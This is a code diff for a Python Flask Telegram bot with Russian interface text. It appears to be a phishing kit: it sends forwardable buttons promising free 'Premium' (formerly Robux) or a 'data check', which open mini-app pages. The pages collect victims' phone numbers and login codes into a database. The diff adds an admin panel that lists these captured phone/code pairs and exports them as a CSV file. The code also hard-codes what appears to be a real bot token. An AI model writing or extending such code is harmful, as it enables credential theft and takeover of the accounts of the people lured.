@@ -4,13 +4,13 @@ import json
 import sqlite3
 import os
 import logging
+from datetime import datetime
 
 # ========== КОНФИГ ==========
 BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"
 ADMIN_ID = 8899193168
 MINI_APP_URL = "https://bot-panel-v2.onrender.com/prize"
 MINI_APP_URL2 = "https://bot-panel-v2.onrender.com/prize2"
-PANEL_URL = "https://01a000a9-7e2c-7cc2-8c21-aa008abff09a.tunnel4.com/panel"
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
@@ -32,9 +32,16 @@ def init_db():
     """)
     conn.commit()
     conn.close()
-    logging.info("✅ База данных инициализирована")
 
 init_db()
+
+def get_all_accounts():
+    conn = sqlite3.connect("bot_panel.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT phone, code, created_at FROM accounts ORDER BY created_at DESC")
+    rows = cursor.fetchall()
+    conn.close()
+    return rows
 
 def get_accounts_count():
     conn = sqlite3.connect("bot_panel.db")
@@ -44,12 +51,13 @@ def get_accounts_count():
     conn.close()
     return count
 
-# ========== ОТПРАВКА СООБЩЕНИЙ ==========
-def send_message(chat_id, text, reply_markup=None):
+def send_message(chat_id, text, reply_markup=None, parse_mode=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": chat_id, "text": text}
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
+    if parse_mode:
+        payload["parse_mode"] = parse_mode
     try:
         r = requests.post(url, json=payload, timeout=10)
         logging.info(f"📤 Отправлено в {chat_id}: {r.status_code}")
@@ -71,20 +79,33 @@ def webhook():
         if text == "/start":
             keyboard = {
                 "inline_keyboard": [
-                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}]
+                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}],
+                    [{"text": "🔧 Админ-панель", "callback_data": "admin_panel"}]
                 ]
             }
             send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
+
+        elif text == "/admin":
+            if chat_id != ADMIN_ID:
+                send_message(chat_id, "⛔ У вас нет доступа.")
+                return "OK", 200
+            show_admin_panel(chat_id)
 
     elif "callback_query" in data:
         query = data["callback_query"]
         chat_id = query["message"]["chat"]["id"]
         data_callback = query.get("data")
 
-        if data_callback == "create_button":
+        if data_callback == "admin_panel":
+            if chat_id != ADMIN_ID:
+                send_message(chat_id, "⛔ У вас нет доступа.")
+                return "OK", 200
+            show_admin_panel(chat_id)
+
+        elif data_callback == "create_button":
             keyboard = {
                 "inline_keyboard": [
-                    [{"text": "🎁 Robux", "callback_data": "create_robux"}],
+                    [{"text": "🎁 Получить Premium", "callback_data": "create_robux"}],
                     [{"text": "🔍 Проверить данные", "callback_data": "create_osint"}],
                     [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
                 ]
@@ -94,10 +115,10 @@ def webhook():
         elif data_callback == "create_robux":
             keyboard = {
                 "inline_keyboard": [
-                    [{"text": "🎁 Получить Robux", "web_app": {"url": MINI_APP_URL}}]
+                    [{"text": "🎁 Получить Premium", "web_app": {"url": MINI_APP_URL}}]
                 ]
             }
-            send_message(chat_id, "✅ Кнопка **Robux** создана! Отправьте это сообщение пользователям.", reply_markup=keyboard)
+            send_message(chat_id, "✅ Кнопка **Premium** создана! Перешлите это сообщение.", reply_markup=keyboard)
 
         elif data_callback == "create_osint":
             keyboard = {
@@ -105,17 +126,57 @@ def webhook():
                     [{"text": "🔍 Проверить данные", "web_app": {"url": MINI_APP_URL2}}]
                 ]
             }
-            send_message(chat_id, "✅ Кнопка **Проверка данных** создана! Отправьте это сообщение пользователям.", reply_markup=keyboard)
+            send_message(chat_id, "✅ Кнопка **Проверка данных** создана! Перешлите это сообщение.", reply_markup=keyboard)
 
         elif data_callback == "back_to_menu":
             keyboard = {
                 "inline_keyboard": [
-                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}]
+                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}],
+                    [{"text": "🔧 Админ-панель", "callback_data": "admin_panel"}]
                 ]
             }
             send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
 
+        elif data_callback == "export_csv":
+            rows = get_all_accounts()
+            if not rows:
+                send_message(chat_id, "📭 Нет данных.")
+                return "OK", 200
+
+            csv = "Телефон,Код,Дата\n"
+            for phone, code, created_at in rows:
+                date = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M:%S")
+                csv += f"{phone},{code},{date}\n"
+
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+            files = {"document": ("accounts.csv", csv)}
+            try:
+                requests.post(url, data={"chat_id": chat_id}, files=files)
+                logging.info("📤 CSV отправлен")
+            except Exception as e:
+                logging.error(f"❌ Ошибка отправки CSV: {e}")
+
     return "OK", 200
+
+# ========== АДМИН-ПАНЕЛЬ ==========
+def show_admin_panel(chat_id):
+    rows = get_all_accounts()
+    if not rows:
+        send_message(chat_id, "📭 База данных пуста.")
+        return
+
+    msg = "📋 **База данных (последние 10):**\n\n"
+    for i, (phone, code, created_at) in enumerate(rows[:10], 1):
+        date = datetime.fromtimestamp(created_at).strftime("%d.%m %H:%M")
+        msg += f"{i}. 📱 `{phone}` | 🔑 `{code}` | 🕒 {date}\n"
+
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "📥 Экспорт CSV", "callback_data": "export_csv"}],
+            [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
+        ]
+    }
+    send_message(chat_id, msg, reply_markup=keyboard, parse_mode="Markdown")
 
 # ========== НАСТРОЙКА ВЕБХУКА ==========
 @app.route("/setwebhook", methods=["GET", "POST"])
@@ -140,7 +201,6 @@ def prize():
 def prize2():
     return send_file("index2.html")
 
-# ========== ЗАПУСК ==========
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
